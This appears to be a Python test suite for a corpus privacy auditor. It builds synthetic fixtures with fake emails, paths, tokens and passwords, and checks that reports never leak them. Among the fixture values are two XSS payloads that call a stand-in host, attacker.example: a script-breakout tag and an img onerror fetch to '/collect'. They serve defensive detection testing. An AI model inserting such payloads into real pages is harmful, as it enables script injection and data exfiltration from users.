#!/usr/bin/env python3
"""Synthetic disclosure-safety tests for the aggregate corpus privacy auditor."""

from __future__ import annotations

import base64
import importlib.util
import json
import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from types import ModuleType


SCRIPT_DIR = Path(__file__).resolve().parent
ROOT = SCRIPT_DIR.parent
AUDITOR_PATH = SCRIPT_DIR / "audit_naturalistic_corpus_privacy.py"


def load_auditor() -> ModuleType:
    spec = importlib.util.spec_from_file_location("audit_naturalistic_corpus_privacy", AUDITOR_PATH)
    if spec is None or spec.loader is None:
        raise RuntimeError(f"could not load {AUDITOR_PATH}")
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


AUDITOR = load_auditor()


PRIVATE_VALUES = {
    "candidate_id": "NPE2-PRIVATECANDIDATEVALUE01",
    "session_ref": "SES2-PRIVATESESSIONVALUE01",
    "source_ref": "SRC2-PRIVATESOURCEVALUE01",
    "session_id": "raw-session-private-identifier",
    "email": "private.person@example.net",
    "path": "/Users/private-owner/Confidential/records.jsonl",
    "phone": "+1 (416) 555-0199",
    "address": "123 Private Avenue",
    "url": "https://private.example.net/resource",
    "token": "sk-" + "proj-" + "AbCdEfGhIjKlMnOpQrStUvWxYz012345",
    "credential": "password=" + "G7vQm2Kp9Xw4Nz8Ba6Ld3Rs1",
    "markup": "</script><script src=\"https://attacker.example/payload.js\"></script>",
    "handler": "<img src=x onerror=\"fetch('https://attacker.example/collect')\">",
    "csp_directive": "private-person-directive",
}


def candidate_record() -> dict[str, object]:
    return {
        "candidate_id": PRIVATE_VALUES["candidate_id"],
        "session_ref": PRIVATE_VALUES["session_ref"],
        "source": "codex",
        "candidate_class": "likely_pragmatic_failure",
        "candidate_score": 8,
        "evidence_strength": "high",
        "primary_phenomenon": "scope_and_authorization",
        "evidence_signals": [{"signal": "repair_non_uptake", "weight": 2}],
        "pragmatic_load_signals": [],
        "alternative_explanations": [],
        "triggering_request": " ".join(
            [
                PRIVATE_VALUES["email"],
                PRIVATE_VALUES["path"],
                PRIVATE_VALUES["phone"],
                PRIVATE_VALUES["address"],
                PRIVATE_VALUES["url"],
            ]
        ),
        "model_visible_response": " ".join(
            [PRIVATE_VALUES["token"], PRIVATE_VALUES["credential"]]
        ),
        "preceding_context": [],
        "user_followup": PRIVATE_VALUES["markup"],
        "immediate_model_response": PRIVATE_VALUES["handler"],
        "text_char_count": 0,
    }


def write_jsonl(path: Path, rows: list[dict[str, object]]) -> None:
    path.write_text(
        "".join(json.dumps(row, ensure_ascii=False) + "\n" for row in rows),
        encoding="utf-8",
    )


def secure_reviewer(rows: list[dict[str, object]]) -> str:
    encoded = base64.b64encode(
        json.dumps(rows, ensure_ascii=False, separators=(",", ":")).encode("utf-8")
    ).decode("ascii")
    nonce = "U3ludGhldGljU2NyaXB0Tm9uY2UxMjM0"
    style_nonce = "U3ludGhldGljU3R5bGVOb25jZTEyMzQ1"
    csp = (
        "default-src 'none'; "
        f"script-src 'nonce-{nonce}'; "
        f"style-src 'nonce-{style_nonce}'; "
        "connect-src 'none'; img-src 'none'; object-src 'none'; frame-src 'none'; "
        f"form-action 'none'; base-uri 'none'; {PRIVATE_VALUES['csp_directive']} 'none'"
    )
    return (
        "<!doctype html><html><head>"
        f'<meta http-equiv="Content-Security-Policy" content="{csp}">'
        f'<style nonce="{style_nonce}">body{{font-family:sans-serif}}</style>'
        "</head><body><main id=\"app\"></main>"
        f'<template id="candidate-data" data-encoding="base64">{encoded}</template>'
        f'<script nonce="{nonce}">document.getElementById("app").textContent="ready";</script>'
        "</body></html>"
    )


def make_v2(root: Path) -> tuple[Path, Path]:
    corpus = root / "corpus-v2"
    restricted = root / "restricted-v2"
    (corpus / "review").mkdir(parents=True)
    (corpus / "reports").mkdir()
    restricted.mkdir()
    record = candidate_record()
    manifest = {
        "schema_version": 2,
        "kind": "privacy_minimized_naturalistic_pragmatic_extremes_corpus",
        "privacy_model_version": 1,
        "candidate_count": 1,
        "review_corpus_count": 1,
        "session_count": 1,
        "restricted_linkage_separate": True,
    }
    (corpus / "corpus-manifest.json").write_text(json.dumps(manifest), encoding="utf-8")
    write_jsonl(corpus / "candidate-index.jsonl", [record])
    write_jsonl(corpus / "review-corpus.jsonl", [record])
    (corpus / "review" / "index.html").write_text(secure_reviewer([record]), encoding="utf-8")
    (corpus / "review" / "README.md").write_text("Private reviewer.", encoding="utf-8")
    (corpus / "reports" / "retrieval-audit.json").write_text("{}\n", encoding="utf-8")
    (corpus / "reports" / "corpus-profile.md").write_text("# Aggregate profile\n", encoding="utf-8")

    (restricted / "id-key.bin").write_bytes(bytes(range(32)))
    (restricted / "source-linkage.csv").write_text(
        "candidate_id,session_ref,source,source_ref,raw_path,session_id,trigger_turn_index,feedback_turn_index,trigger_node_id,feedback_node_id,start_line,end_line\n"
        f"{PRIVATE_VALUES['candidate_id']},{PRIVATE_VALUES['session_ref']},codex,{PRIVATE_VALUES['source_ref']},{PRIVATE_VALUES['path']},{PRIVATE_VALUES['session_id']},1,2,node-a,node-b,10,20\n",
        encoding="utf-8",
    )
    (restricted / "source-fingerprints.csv").write_text(
        "source_ref,source,raw_path,source_sha256,byte_size\n"
        f"{PRIVATE_VALUES['source_ref']},codex,{PRIVATE_VALUES['path']},{'A' * 64},123\n",
        encoding="utf-8",
    )
    for directory in (corpus, corpus / "review", corpus / "reports", restricted):
        directory.chmod(0o700)
    for path in [*corpus.rglob("*"), *restricted.rglob("*")]:
        if path.is_file():
            path.chmod(0o600)
    return corpus, restricted


def make_v1(root: Path) -> Path:
    corpus = root / "corpus-v1"
    (corpus / "review").mkdir(parents=True)
    record = candidate_record()
    all_candidates = corpus / "all-candidates.jsonl"
    write_jsonl(all_candidates, [record])
    review = corpus / "review-corpus.jsonl"
    os.link(all_candidates, review)
    (corpus / "provenance-index.csv").write_text(
        "candidate_id,session_ref,raw_path,session_id\n"
        f"{PRIVATE_VALUES['candidate_id']},{PRIVATE_VALUES['session_ref']},{PRIVATE_VALUES['path']},{PRIVATE_VALUES['session_id']}\n",
        encoding="utf-8",
    )
    unsafe_payload = json.dumps([record], ensure_ascii=False)
    (corpus / "review" / "index.html").write_text(
        f"<!doctype html><main></main><script>const ITEMS={unsafe_payload};</script>",
        encoding="utf-8",
    )
    (corpus / "unrecognized-private.person@example.net.txt").write_text(
        PRIVATE_VALUES["email"], encoding="utf-8"
    )
    (corpus / "unrecognized-private.person@example.net.txt").chmod(0o644)
    os.symlink(PRIVATE_VALUES["path"], corpus / "unrecognized-sensitive-link")
    return corpus


class AggregatePrivacyAuditTests(unittest.TestCase):
    def assert_no_private_values(self, report: dict[str, object]) -> None:
        serialized = json.dumps(report, sort_keys=True)
        for value in PRIVATE_VALUES.values():
            self.assertNotIn(value, serialized)
        self.assertNotIn("unrecognized-private.person@example.net.txt", serialized)
        self.assertNotIn("unrecognized-sensitive-link", serialized)

    def test_v2_reports_aggregate_findings_structure_and_linkage(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            corpus, restricted = make_v2(Path(temporary))
            report = AUDITOR.build_audit(corpus, restricted)
            self.assertEqual(report["detected_layout"], "v2_privacy_minimized")
            self.assert_no_private_values(report)
            findings = report["aggregate_findings"]
            self.assertGreater(findings["direct_identifiers"]["match_count"], 0)
            self.assertGreater(findings["high_confidence_secrets"]["match_count"], 0)
            self.assertGreater(
                findings["active_markup_network_primitives"]["match_count"], 0
            )
            self.assertIn("triggering_request", findings["direct_identifiers"]["by_field"])
            self.assertIn("raw_path", findings["direct_identifiers"]["by_field"])

            inventory = report["inventory"]
            self.assertEqual(inventory["restricted_key_file_count"], 1)
            self.assertEqual(inventory["restricted_32_byte_key_file_count"], 1)
            self.assertEqual(inventory["symlink_count"], 0)
            self.assertEqual(inventory["non_owner_only_file_count"], 0)
            for file_report in report["files"]:
                if file_report["node_type"] == "regular_file":
                    self.assertRegex(file_report["sha256"], r"^[0-9a-f]{64}$")
                self.assertNotIn("path", file_report)
                self.assertNotIn("filename", file_report)

            renderers = [
                row for row in report["files"] if row["role"] == "reviewer_html"
            ]
            self.assertEqual(len(renderers), 1)
            renderer = renderers[0]["renderer"]
            self.assertEqual(renderer["script_element_count"], 1)
            self.assertEqual(renderer["csp_authorized_script_count"], 1)
            self.assertEqual(renderer["external_resource_attribute_count"], 0)
            self.assertEqual(renderer["event_handler_attribute_count"], 0)
            self.assertEqual(renderer["decoded_record_count"], 1)

            linkage = report["provenance_and_linkage"]
            comparison = linkage["coverage_comparisons"][
                "v2_candidate_index_to_source_linkage_candidate_id"
            ]
            self.assertEqual(comparison["intersection_count"], 1)
            self.assertEqual(comparison["left_only_count"], 0)
            self.assertEqual(comparison["right_only_count"], 0)
            renderer_comparison = linkage["coverage_comparisons"][
                "renderer_payload_to_review_candidate_id"
            ]
            self.assertEqual(renderer_comparison["intersection_count"], 1)

    def test_v1_reports_unsafe_renderer_duplicates_modes_and_symlink(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            corpus = make_v1(Path(temporary))
            report = AUDITOR.build_audit(corpus)
            self.assertEqual(report["detected_layout"], "v1_raw_derivative")
            self.assert_no_private_values(report)
            self.assertEqual(report["inventory"]["symlink_count"], 1)
            self.assertGreater(report["inventory"]["non_owner_only_file_count"], 0)
            self.assertGreater(report["duplication"]["byte_identical_group_count"], 0)
            self.assertGreater(report["duplication"]["hardlink_group_count"], 0)
            renderer = next(
                row["renderer"]
                for row in report["files"]
                if row["role"] == "reviewer_html"
            )
            self.assertGreater(renderer["script_closing_sequence_count"], 1)
            self.assertGreater(renderer["external_resource_attribute_count"], 0)
            self.assertGreater(renderer["event_handler_attribute_count"], 0)

    def test_cli_owner_only_output_excludes_itself_and_never_prints_values(self) -> None:
        with tempfile.TemporaryDirectory(dir=ROOT / "private") as temporary:
            root = Path(temporary)
            corpus, restricted = make_v2(root)
            output = corpus / "reports" / "privatization-audit.json"
            output.write_text(
                json.dumps(
                    {
                        "schema_version": 1,
                        "kind": "naturalistic_corpus_privatization_audit",
                        "generated_at": "2026-07-16T12:00:00Z",
                        "before": {"available": False},
                        "transformations": {
                            "keyed_hmac_candidate_ids": 1,
                            "keyed_hmac_session_ids": 1,
                        },
                        "after": {
                            "residual_identifier_counts": {
                                "email": {"matches": 0, "records": 0, "fields": {}}
                            },
                            "reviewer_finalized": False,
                        },
                        "claim_boundary": "Synthetic private fixture.",
                    }
                ),
                encoding="utf-8",
            )
            output.chmod(0o600)
            completed = subprocess.run(
                [
                    sys.executable,
                    os.fspath(AUDITOR_PATH),
                    "--corpus-dir",
                    os.fspath(corpus),
                    "--restricted-dir",
                    os.fspath(restricted),
                    "--output",
                    os.fspath(output),
                ],
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(completed.returncode, 0, completed.stderr)
            self.assertTrue(output.is_file())
            self.assertEqual(output.stat().st_mode & 0o077, 0)
            report = json.loads(output.read_text(encoding="utf-8"))
            self.assert_no_private_values(report)
            self.assertEqual(report["kind"], "naturalistic_corpus_privatization_audit")
            self.assertTrue(report["after"]["reviewer_finalized"])
            aggregate = report["after"]["aggregate_privacy_scan"]
            self.assertNotIn("privatization_audit", aggregate["inventory"]["role_counts"])
            corpus_inventory = report["after"]["corpus_file_inventory"]
            self.assertNotIn(
                "reports/privatization-audit.json",
                {row["relative_path"] for row in corpus_inventory},
            )
            self.assertEqual(
                corpus_inventory,
                AUDITOR.finalized_inventory(
                    corpus,
                    AUDITOR.FINAL_CORPUS_FILES,
                    excluded={"reports/privatization-audit.json"},
                ),
            )
            self.assertEqual(
                report["after"]["restricted_file_inventory"],
                AUDITOR.finalized_inventory(restricted, AUDITOR.FINAL_RESTRICTED_FILES),
            )
            self.assertEqual(
                report["after"]["duplicate_groups"],
                AUDITOR.finalized_duplicate_groups(corpus_inventory),
            )
            for value in PRIVATE_VALUES.values():
                self.assertNotIn(value, completed.stdout)
                self.assertNotIn(value, completed.stderr)

    def test_output_symlink_is_rejected_without_touching_target(self) -> None:
        with tempfile.TemporaryDirectory(dir=ROOT / "private") as temporary:
            root = Path(temporary)
            target = root / "target.json"
            target.write_text('{"preserved": true}\n', encoding="utf-8")
            output = root / "report.json"
            output.symlink_to(target)

            with self.assertRaisesRegex(ValueError, "must not traverse a symlink"):
                AUDITOR.write_report({"kind": "synthetic"}, output)

            self.assertEqual(target.read_text(encoding="utf-8"), '{"preserved": true}\n')
            self.assertTrue(output.is_symlink())

    def test_output_hardlink_is_replaced_without_truncating_peer(self) -> None:
        with tempfile.TemporaryDirectory(dir=ROOT / "private") as temporary:
            root = Path(temporary)
            peer = root / "peer.json"
            peer.write_text('{"preserved": true}\n', encoding="utf-8")
            output = root / "report.json"
            os.link(peer, output)

            AUDITOR.write_report({"kind": "synthetic"}, output)

            self.assertEqual(peer.read_text(encoding="utf-8"), '{"preserved": true}\n')
            self.assertEqual(json.loads(output.read_text(encoding="utf-8")), {"kind": "synthetic"})
            self.assertNotEqual(peer.stat().st_ino, output.stat().st_ino)

    def test_finalization_rejects_unrecognized_filename(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            corpus, _restricted = make_v2(Path(temporary))
            (corpus / "unexpected-private-note.txt").write_text(
                "synthetic private text", encoding="utf-8"
            )
            with self.assertRaisesRegex(ValueError, "unrecognized filename"):
                AUDITOR.finalized_inventory(corpus, AUDITOR.FINAL_CORPUS_FILES)

    def test_legacy_context_sanitizer_drops_arbitrary_narrative(self) -> None:
        contextual = {
            "kind": "naturalistic_corpus_contextual_privacy_audit",
            "audit_date": "2026-07-16",
            "sample": {
                "size": 1,
                "composition": {name: 0 for name in AUDITOR.V1_CONTEXT_COMPOSITION_FIELDS},
                "sorted_id_manifest_sha256": "a" * 64,
                "arbitrary_narrative": PRIVATE_VALUES["email"],
            },
            "overlapping_risk_counts": {
                name: 0 for name in AUDITOR.V1_CONTEXT_RISK_FIELDS
            },
            "disposition": {
                name: 0 for name in AUDITOR.V1_CONTEXT_DISPOSITION_FIELDS
            },
            "authentication_material": {
                "high_confidence_live_secret_found": False,
                "arbitrary_narrative": PRIVATE_VALUES["path"],
            },
            "arbitrary_narrative": PRIVATE_VALUES["url"],
        }

        sanitized = AUDITOR.sanitized_legacy_context(contextual)

        serialized = json.dumps(sanitized, sort_keys=True)
        self.assertNotIn("arbitrary_narrative", serialized)
        for value in PRIVATE_VALUES.values():
            self.assertNotIn(value, serialized)


if __name__ == "__main__":
    unittest.main()
